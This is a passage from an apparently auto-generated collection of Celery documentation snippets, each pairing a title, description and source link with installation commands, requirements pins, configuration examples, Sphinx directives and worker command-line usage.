This bundle includes all necessary dependencies to use Google Pub/Sub as a message broker with Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/gcpubsub.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install \"celery[gcpubsub]\"\n```\n\n----------------------------------------\n\nTITLE: Specifying Python Dependencies in requirements.txt Format\nDESCRIPTION: Declares Python package dependencies using the standard requirements file format. It requires boto3 (version 1.26.143 or higher) for AWS interaction, urllib3 (version 1.26.16 or higher), and kombu (version 5.3.4 or higher) with the optional 'sqs' feature enabled. This configuration is common for Celery applications using AWS SQS as a message broker. This file is intended to be used with package managers like pip (e.g., `pip install -r <filename>`).\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/sqs.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nboto3>=1.26.143\nurllib3>=1.26.16\nkombu[sqs]>=5.3.4\n```\n\n----------------------------------------\n\nTITLE: Migrating TaskSet to group Constructor\nDESCRIPTION: Shows migration from deprecated TaskSet syntax to the newer group construct introduced in Celery 3.0 for handling task groups.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_24\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery.task import TaskSet\n\n>>> TaskSet(add.subtask((i, i)) for i in xrange(10)).apply_async()\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery import group\n>>> group(add.s(i, i) for i in xrange(10))()\n```\n\n----------------------------------------\n\nTITLE: Group Unrolling Example in Celery\nDESCRIPTION: Shows how a group with a single signature will be unrolled into a chain, demonstrating the difference in behavior based on the number of tasks in the group.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_49\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chain, group\n>>> from tasks import add\n>>> chain(add.s(2, 2), group(add.s(1)), add.s(1))\nadd(2, 2) | add(1) | add(1)\n>>> chain(add.s(2, 2), group(add.s(1), add.s(2)), add.s(1))\nadd(2, 2) | %add((add(1), add(2)), 1)\n```\n\n----------------------------------------\n\nTITLE: Sampling Celery Task Memory Usage with Python\nDESCRIPTION: This Python snippet demonstrates how to monitor the memory usage of a Celery application while tasks are being executed. It imports `sample_mem` and `memdump` from `celery.utils.debug` along with a hypothetical task `add`. Within nested loops dispatching tasks using `add.delay(i, j)`, `sample_mem()` is called periodically to record memory usage snapshots. A `finally` block ensures `memdump()` is executed at the end, printing the collected memory samples, which helps in diagnosing memory leaks or high usage patterns.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.utils.debug.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.utils.debug import sample_mem, memdump\n\nfrom tasks import add\n\n\ntry:\n    for i in range(100):\n        for j in range(100):\n            add.delay(i, j)\n        sample_mem()\nfinally:\n    memdump()\n```\n\n----------------------------------------\n\nTITLE: Specifying Project Dependencies - Requirements File - Text\nDESCRIPTION: This snippet lists the Python package dependencies (with version constraints) required for the Celery project to function correctly. It employs environment markers (e.g., python_version < '3.9') for conditional dependencies and uses the standardized requirements.txt syntax, which should be processed with pip. Each line specifies a separate requirement, and proper installation ensures that Celery runs consistently in different environments.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/default.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nbilliard>=4.2.1,<5.0\nkombu>=5.5.2,<5.6\nvine>=5.1.0,<6.0\nclick>=8.1.2,<9.0\nclick-didyoumean>=0.3.0\nclick-repl>=0.2.0\nclick-plugins>=1.1.1\nbackports.zoneinfo[tzdata]>=0.2.1; python_version < '3.9'\npython-dateutil>=2.8.2\n```\n\n----------------------------------------\n\nTITLE: Configuring Advanced Astra DB Driver Settings in Celery\nDESCRIPTION: Additional configuration for the Astra DB driver in Celery, including explicit protocol version and region-specific load-balancing policy using execution profiles.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nfrom cassandra.policies import DCAwareRoundRobinPolicy\nfrom cassandra.cluster import ExecutionProfile\nfrom cassandra.cluster import EXEC_PROFILE_DEFAULT\nmyEProfile = ExecutionProfile(\n  load_balancing_policy=DCAwareRoundRobinPolicy(\n    local_dc='europe-west1',  # for Astra DB, region name = dc name\n  )\n)\ncassandra_options = {\n  'protocol_version': 4,      # for Astra DB\n  'execution_profiles': {EXEC_PROFILE_DEFAULT: myEProfile},\n}\n```\n\n----------------------------------------\n\nTITLE: Celery Worker Log Configuration\nDESCRIPTION: Example of configuring worker log files using node name and hostname formatting options\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ celery -A proj worker -n foo@%h --logfile=%n.log --statedb=%n.db\n```\n\n----------------------------------------\n\nTITLE: Running Celery init.d Script in Verbose Mode - Shell (console)\nDESCRIPTION: Demonstrates how to invoke the Celery init.d script for the worker in verbose (debugging) mode using the shell with the '-x' option. No dependencies other than having the Celery init script present at the given location. Inputs: no parameters. Outputs: shell debug output, useful for troubleshooting startup issues or errors not shown in log files.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n# sh -x /etc/init.d/celeryd start\n```\n\n----------------------------------------\n\nTITLE: Installing Celery Development Version with pip\nDESCRIPTION: This snippet demonstrates how to install the latest development versions of Celery and its dependencies using pip and GitHub repositories.\nSOURCE: https://github.com/celery/celery/blob/main/README.rst#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ pip install https://github.com/celery/celery/zipball/main#egg=celery\n$ pip install https://github.com/celery/billiard/zipball/main#egg=billiard\n$ pip install https://github.com/celery/py-amqp/zipball/main#egg=amqp\n$ pip install https://github.com/celery/kombu/zipball/main#egg=kombu\n$ pip install https://github.com/celery/vine/zipball/main#egg=vine\n```\n\n----------------------------------------\n\nTITLE: Documenting celery.bin.amqp Module Structure in RST\nDESCRIPTION: RST documentation structure defining the layout and automodule directives for the celery.bin.amqp module documentation. Includes table of contents and module reference configuration.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.amqp.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n====================\n ``celery.bin.amqp``\n====================\n\n.. contents::\n   :local:\n.. currentmodule:: celery.bin.amqp\n\n.. automodule:: celery.bin.amqp\n   :members:\n   :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Marking Test for Default Celery App Access in Python\nDESCRIPTION: This code snippet shows how to mark a test that needs to access the default Celery app when the app trap is enabled. It uses the 'depends_on_current_app' fixture to allow default app access.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_18\n\nLANGUAGE: Python\nCODE:\n```\n@pytest.mark.usefixtures('depends_on_current_app')\ndef test_something():\n    something()\n```\n\n----------------------------------------\n\nTITLE: Updating Task Instantiation Pattern for Method Calls in Python\nDESCRIPTION: Demonstrates the change in how task methods are called in the new API. Instead of calling methods directly on the Task class, users need to instantiate the task first before calling methods.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/deprecation.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> MyTask.delay()          # NO LONGER WORKS\n\n\n>>> MyTask().delay()        # WORKS!\n```\n\n----------------------------------------\n\nTITLE: Specifying Package Dependencies - requirements.txt - Plaintext\nDESCRIPTION: Lists the 'pydocumentdb' package with the required version 2.3.5 for installation in the Python environment. This file should be used with pip (e.g., 'pip install -r requirements.txt') to ensure all necessary packages are installed before running the project. It is crucial for defining package constraints for consistent deployments; no input/output is performed directly by this file.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/cosmosdbsql.txt#2025-04-23_snippet_0\n\nLANGUAGE: Plaintext\nCODE:\n```\npydocumentdb==2.3.5\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Backend\nDESCRIPTION: Example of configuring the Celery cache backend using memcached servers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nCELERY_CACHE_BACKEND = 'memcached://A.example.com:11211;B.example.com'\n```\n\n----------------------------------------\n\nTITLE: Declaring Platform-Specific Dependencies in Requirements File - Requirements/INI\nDESCRIPTION: This snippet specifies two dependencies with environment markers: \\'brotlipy\\' for PyPy (version 0.7.0 or higher) and \\'brotli\\' for CPython (version 1.0.0 or higher). These markers ensure that only the appropriate compression library is installed depending on the Python implementation. The usage is suitable for requirements.txt or pip configuration files to provide cross-platform support. To function correctly, pip version 6.0 or above is required for environment marker support.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/brotli.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\nbrotlipy>=0.7.0;platform_python_implementation==\"PyPy\"\nbrotli>=1.0.0;platform_python_implementation==\"CPython\"\n```\n\n----------------------------------------\n\nTITLE: Excluding Queues from Celery Worker Consumption via Command Line - Console\nDESCRIPTION: Illustrates how to use the -X option with 'celery worker' to exclude specific queues from consumption. Useful when you want to process all but a named subset of queues defined in your configuration. Requires Celery installed. Input: name(s) of queues to exclude; Output: worker consumes all but those queues.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_18\n\nLANGUAGE: console\nCODE:\n```\n# Consume from all queues in CELERY_QUEUES, but not the 'foo' queue.\n$ celery worker -A proj -l info -X foo\n```\n\n----------------------------------------\n\nTITLE: Signal Connection Using Decorator Pattern in Python\nDESCRIPTION: Example of connecting a task_sent signal handler using the @signal.connect decorator syntax. The handler function receives sent task information via kwargs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.5.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.signals import task_sent\n\n@task_sent.connect\ndef on_task_sent(**kwargs):\n    print('sent task: %r' % (kwargs,))\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive `.. currentmodule::` sets the default module context for subsequent documentation directives (like `autoclass`, `autofunction`, etc.) within the document. Here, it specifies `celery.contrib.pytest` as the active module, meaning references to classes or functions can be made without the full module path.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.pytest.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.contrib.pytest\n```\n\n----------------------------------------\n\nTITLE: Defining Cryptography Dependency for Python Project\nDESCRIPTION: Specifies a required dependency on the 'cryptography' Python library, fixed at version 44.0.2. This line is typically found in a requirements file (e.g., requirements.txt) and used by pip to install the exact library version needed for the project.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/auth.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\ncryptography==44.0.2\n```\n\n----------------------------------------\n\nTITLE: Protocol V2 Task Message Definition in Python\nDESCRIPTION: Defines the structure of Version 2 task messages including properties, headers, and body format specifications\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/protocol.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nproperties = {\n    'correlation_id': uuid task_id,\n    'content_type': string mimetype,\n    'content_encoding': string encoding,\n\n    # optional\n    'reply_to': string queue_or_url,\n}\nheaders = {\n    'lang': string 'py'\n    'task': string task,\n    'id': uuid task_id,\n    'root_id': uuid root_id,\n    'parent_id': uuid parent_id,\n    'group': uuid group_id,\n\n    # optional\n    'meth': string method_name,\n    'shadow': string alias_name,\n    'eta': iso8601 ETA,\n    'expires': iso8601 expires,\n    'retries': int retries,\n    'timelimit': (soft, hard),\n    'argsrepr': str repr(args),\n    'kwargsrepr': str repr(kwargs),\n    'origin': str nodename,\n    'replaced_task_nesting': int\n}\n\nbody = (\n    object[] args,\n    Mapping kwargs,\n    Mapping embed {\n        'callbacks': Signature[] callbacks,\n        'errbacks': Signature[] errbacks,\n        'chain': Signature[] chain,\n        'chord': Signature chord_callback,\n    }\n)\n```\n\n----------------------------------------\n\nTITLE: Defining pytest-celery Dependency with Version Constraint\nDESCRIPTION: This line specifies a dependency on the 'pytest-celery' Python package for a project. It requires installing a version greater than or equal to 1.2.0 but strictly less than 1.3.0. The '[all]' part indicates that all optional dependencies (extras) defined by the `pytest-celery` package should also be installed. This format is typically used in `requirements.txt` files or package setup configurations.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/pytest.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\npytest-celery[all]>=1.2.0,<1.3.0\n```\n\n----------------------------------------\n\nTITLE: Implementing Default Values in Python Classes for Celery\nDESCRIPTION: Demonstrates how to set default values for class attributes in Celery, allowing them to be overridden by instantiation or inheritance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/guide.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nclass Producer:\n    active = True\n    serializer = 'json'\n\n    def __init__(self, serializer=None, active=None):\n        self.serializer = serializer or self.serializer\n\n        # must check for None when value can be false-y\n        self.active = active if active is not None else self.active\n```\n\n----------------------------------------\n\nTITLE: Uninstalling Celery Helm Chart - Shell\nDESCRIPTION: This command uninstalls the Celery Helm release from the Kubernetes cluster using helm CLI. It completely removes the deployed resources associated with the celery release. Requires the helm tool and appropriate cluster context.\nSOURCE: https://github.com/celery/celery/blob/main/helm-chart/README.rst#2025-04-23_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nhelm uninstall celery\n```\n\n----------------------------------------\n\nTITLE: Installing Default and Test Requirements with pip (Bash)\nDESCRIPTION: Illustrates installing both the main and test dependencies using pip from their respective requirements files. The first command sets up the default dependencies, while the second adds testing-specific packages, ensuring the environment is ready for executing the full unittest suite. Suitable for contributors or CI systems needing a comprehensive test setup; Python and pip must be installed beforehand.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/README.rst#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ pip install -U -r requirements/default.txt\n$ pip install -U -r requirements/test.txt\n```\n\n----------------------------------------\n\nTITLE: Module Documentation Block in RST\nDESCRIPTION: RestructuredText directive for auto-generating module documentation with local table of contents.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.app.amqp.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.app.amqp\n\n    .. contents::\n        :local:\n```\n\n----------------------------------------\n\nTITLE: Migrating from celery.decorators import task to celery import task in Python\nDESCRIPTION: Shows how to update imports when the celery.decorators module is removed in version 5.0. Users need to change imports to use the main celery package.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/deprecation.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.decorators import task\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import task\n```\n\n----------------------------------------\n\nTITLE: Upgrading Celery to a Secure Version - Shell\nDESCRIPTION: This shell command updates Celery to the latest available version (4.0.1 or above) using pip. Running this command ensures that users are protected from the configuration vulnerability present in 4.0.0 and prior. It requires Python's pip package manager and appropriate user permissions for package installation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/sec/CELERYSA-0003.txt#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ pip install -U celery\n```\n\n----------------------------------------\n\nTITLE: Request Object Creation in Consumer\nDESCRIPTION: The consumer component receives messages from the broker using Kombu and converts them into Request objects for processing. Handles ETA scheduling and rate-limiting of tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/worker.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.worker.request import Request\n```\n\n----------------------------------------\n\nTITLE: Custom Task Implementation Example in Celery\nDESCRIPTION: Demonstrates how a simple decorated Celery task is transformed into a custom Task class behind the scenes. Shows the relationship between task decorators and the underlying class structure.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef add(x, y):\n    return x + y\n```\n\nLANGUAGE: python\nCODE:\n```\nclass _AddTask(app.Task):\n\n    def run(self, x, y):\n        return x + y\nadd = app.tasks[_AddTask.name]\n```\n\n----------------------------------------\n\nTITLE: Overriding Default Behavior: Synchronous Subtask Execution\nDESCRIPTION: This code demonstrates how to force synchronous subtask execution within a Celery task by using the disable_sync_subtasks parameter. This is not recommended but may be needed in rare cases.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get(disable_sync_subtasks=False)\n    info = parse_page.delay(page).get(disable_sync_subtasks=False)\n    store_page_info.delay(url, info)\n\n@app.task\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task\ndef store_page_info(url, info):\n    return PageInfo.objects.create(url, info)\n```\n\n----------------------------------------\n\nTITLE: Listing Active Queues via Command Line\nDESCRIPTION: Command to list active queues on workers using the celery inspect interface. Shows how to get information about which queues workers are consuming from.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_30\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect active_queues\n[...]\n```\n\n----------------------------------------\n\nTITLE: Illustrating Old Celery AMQP Settings (Pre-v0.8.1) in Python\nDESCRIPTION: This snippet shows the deprecated format for configuring the AMQP message broker connection in Celery prior to version 0.8.1. These settings (AMQP_SERVER, AMQP_PORT, etc.) were renamed to use the BROKER_ prefix in subsequent versions as part of a standardization effort.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nAMQP_SERVER = 'localhost'\nAMQP_PORT = 5678\nAMQP_USER = 'myuser'\nAMQP_PASSWORD = 'mypassword'\nAMQP_VHOST = 'celery'\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Utils Imports Module in Python\nDESCRIPTION: This code snippet demonstrates how to import the celery.utils.imports module in Python. It is typically used at the beginning of a Python file that needs to use the functionality provided by this module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.imports.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nfrom celery.utils import imports\n```\n\n----------------------------------------\n\nTITLE: Creating Symbolic Link for /dev/shm in Console\nDESCRIPTION: This console command provides a workaround for Debian-based distributions that have renamed /dev/shm to /run/shm by creating a symbolic link.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n# ln -s /run/shm /dev/shm\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Stamping Visitor with Callback Support in Python\nDESCRIPTION: Defines a custom stamping visitor that stamps signatures, callbacks, and errbacks differently. This demonstrates the flexibility of the stamping API.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_74\n\nLANGUAGE: python\nCODE:\n```\nclass CustomStampingVisitor(StampingVisitor):\n    def on_signature(self, sig, **headers) -> dict:\n        return {'header': 'value'}\n\n    def on_callback(self, callback, **header) -> dict:\n        return {'on_callback': True}\n\n    def on_errback(self, errback, **header) -> dict:\n        return {'on_errback': True}\n```\n\n----------------------------------------\n\nTITLE: Defining Conditional `tblib` Version based on Python Version\nDESCRIPTION: These lines specify the minimum required version of the `tblib` library, conditional on the Python runtime version, using environment markers. For Python 3.8.0 and newer, `tblib` version 1.5.0 or higher is needed. For Python versions older than 3.8.0, `tblib` version 1.3.0 or higher is required. This syntax is typically used in Python package dependency files like `requirements.txt` or within `setup.py`/`pyproject.toml`.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/tblib.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\ntblib>=1.5.0;python_version>='3.8.0'\ntblib>=1.3.0;python_version<'3.8.0'\n```\n\n----------------------------------------\n\nTITLE: Setting CELERYBEAT_SCHEDULER Example in Python\nDESCRIPTION: Example of how to configure the CELERYBEAT_SCHEDULER setting to use a custom scheduler, specifically the Django database scheduler.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nCELERYBEAT_SCHEDULER = 'djcelery.schedulers.DatabaseScheduler'\n```\n\n----------------------------------------\n\nTITLE: Defining Conditional librabbitmq Dependency in Python Requirements\nDESCRIPTION: Specifies 'librabbitmq' version 2.0.0 or greater as a dependency, conditional on the Python version being less than 3.11. This syntax, using environment markers, is typically used in Python package dependency files (e.g., requirements.txt, setup.py, pyproject.toml) to ensure the correct packages are installed based on the environment.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/librabbitmq.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\nlibrabbitmq>=2.0.0; python_version < '3.11'\n```\n\n----------------------------------------\n\nTITLE: Defining Sphinx Documentation Structure for celery.concurrency.eventlet\nDESCRIPTION: This snippet sets up the Sphinx documentation structure for the celery.concurrency.eventlet module. It includes a table of contents, sets the current module, and uses automodule to generate documentation for all members and undocumented members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.concurrency.eventlet.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n=============================================================\n ``celery.concurrency.eventlet``\n=============================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.concurrency.eventlet\n\n.. automodule:: celery.concurrency.eventlet\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx (reStructuredText)\nDESCRIPTION: This Sphinx directive generates a table of contents specific to the current section or file. It uses the `:local:` option to limit the scope of the generated table. Requires the Sphinx documentation generator to be processed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.events.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Declaring zstandard Dependency Requirement\nDESCRIPTION: Specifies a requirement for the Python package 'zstandard', exactly version 0.23.0. This format is commonly used in Python project dependency files (like requirements.txt) managed by tools such as pip.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/zstd.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nzstandard==0.23.0\n```\n\n----------------------------------------\n\nTITLE: Defining Redis Version Constraint for Python Package Management\nDESCRIPTION: This line specifies the required version constraints for the 'redis' Python package using the format understood by pip. It mandates installing a version greater than or equal to 4.5.2, strictly less than 6.0.0, and explicitly avoiding version 4.5.5. This is typically used in `requirements.txt` or similar dependency management files.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/redis.txt#2025-04-23_snippet_0\n\nLANGUAGE: requirements\nCODE:\n```\nredis>=4.5.2,<6.0.0,!=4.5.5\n```\n\n----------------------------------------\n\nTITLE: Identifying the TERM Signal\nDESCRIPTION: Represents the SIGTERM signal identifier. When the `REMAP_SIGTERM` feature is enabled, receiving this signal can initiate a soft or cold shutdown in Celery, similar to SIGQUIT.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_7\n\nLANGUAGE: Identifier\nCODE:\n```\n:sig:`TERM`\n```\n\n----------------------------------------\n\nTITLE: Listing Active Queues for Specific Worker\nDESCRIPTION: Command to list active queues on a specific worker using the --destination option. This allows targeting the active_queues inspection to a particular worker instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_31\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect active_queues -d celery@worker1.local\n[...]\n```\n\n----------------------------------------\n\nTITLE: Handling ZLIB Import Error in Python\nDESCRIPTION: Example showing ZLIB import error when Python is not compiled with ZLIB support.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n>>> import zlib\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'zlib'\n```\n\n----------------------------------------\n\nTITLE: Defining Celery Concurrency Module Documentation Structure\nDESCRIPTION: ReStructuredText markup defining the documentation structure for the celery.concurrency module. Includes table of contents, module reference and member documentation directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.concurrency.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n==================================\n ``celery.concurrency``\n==================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.concurrency\n\n.. automodule:: celery.concurrency\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery CLI Command\nDESCRIPTION: Example showing the new CLI command structure for Celery 5.1 where global options must be positioned before the sub-command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.1.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncelery --app path.to.app worker\n```\n\n----------------------------------------\n\nTITLE: Defining Python Project Dependency in requirements.txt\nDESCRIPTION: This snippet specifies that the 'mock' package, version 1.3 or higher, is required for the project. No import or execution is needed; dependencies should be installed using pip, for example with 'pip install -r requirements.txt'. The syntax follows requirements.txt conventions, using 'package>=version' to indicate a minimum version constraint. Limitations include lack of in-line comments and that only one dependency is listed.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/deps/mock.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nmock>=1.3\n```\n\n----------------------------------------\n\nTITLE: Specifying pycouchdb Dependency (Version 1.16.0) in Requirements\nDESCRIPTION: This line specifies a dependency on the 'pycouchdb' Python package, pinning the required version to exactly 1.16.0. It is typically found in a requirements file (e.g., requirements.txt) and used by package managers like pip to install the correct version of the library.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/couchdb.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\npycouchdb==1.16.0\n```\n\n----------------------------------------\n\nTITLE: Overriding Concurrency for Worker Ranges with `celeryd-multi` (Console)\nDESCRIPTION: Explains how to apply specific options, like concurrency (`-c 10`), to a range of workers (`-c:1-3`) when using `celeryd-multi`. This overrides the default concurrency (`-c 3`) for workers 1, 2, and 3. The output shows the intended individual commands (note: the output in the source text incorrectly uses `celeryd-multi` instead of `celeryd`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_24\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start 5 -c 3  -c:1-3 10\nceleryd-multi -n celeryd1.myhost -c 10\nceleryd-multi -n celeryd2.myhost -c 10\nceleryd-multi -n celeryd3.myhost -c 10\nceleryd-multi -n celeryd4.myhost -c 3\nceleryd-multi -n celeryd5.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Displaying Celery Events Help\nDESCRIPTION: Shows the available command-line options and help information for the `celery events` command.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_29\n\nLANGUAGE: console\nCODE:\n```\n$ celery events --help\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Module Documentation Headers\nDESCRIPTION: RST documentation headers and configuration for the celery.events.snapshot module documentation, including table of contents and module import directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.events.snapshot.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n==========================================\n ``celery.events.snapshot``\n==========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.events.snapshot\n\n.. automodule:: celery.events.snapshot\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Class Naming Conventions in Python\nDESCRIPTION: Shows examples of correct and incorrect class naming conventions in Celery, including test cases and 'action' classes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/guide.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n# - test case for a class\nclass TestMyClass(Case):                # BAD\n    pass\n\nclass test_MyClass(Case):               # GOOD\n    pass\n\n# - test case for a function\nclass TestMyFunction(Case):             # BAD\n    pass\n\nclass test_my_function(Case):           # GOOD\n    pass\n\n# - \"action\" class (verb)\nclass UpdateTwitterStatus:    # BAD\n    pass\n\nclass update_twitter_status:    # GOOD\n    pass\n```\n\n----------------------------------------\n\nTITLE: Defining SQLAlchemy Version Constraint\nDESCRIPTION: This line specifies the required version range for the SQLAlchemy package, ensuring compatibility. It mandates installing a version that is at least 1.4.48 but strictly less than 2.1. This constraint is typically used in Python package management files (like requirements.txt) processed by tools such as pip.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/sqlalchemy.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsqlalchemy>=1.4.48,<2.1\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx RST\nDESCRIPTION: This reStructuredText snippet employs the Sphinx `currentmodule` directive. It sets the default Python module context to `celery.worker.consumer.tasks` for subsequent Sphinx directives (like `autofunction`, `autoclass`, etc.) within the document, eliminating the need to repeatedly specify the full module path.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.consumer.tasks.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.worker.consumer.tasks\n```\n\n----------------------------------------\n\nTITLE: Task Logging Format in 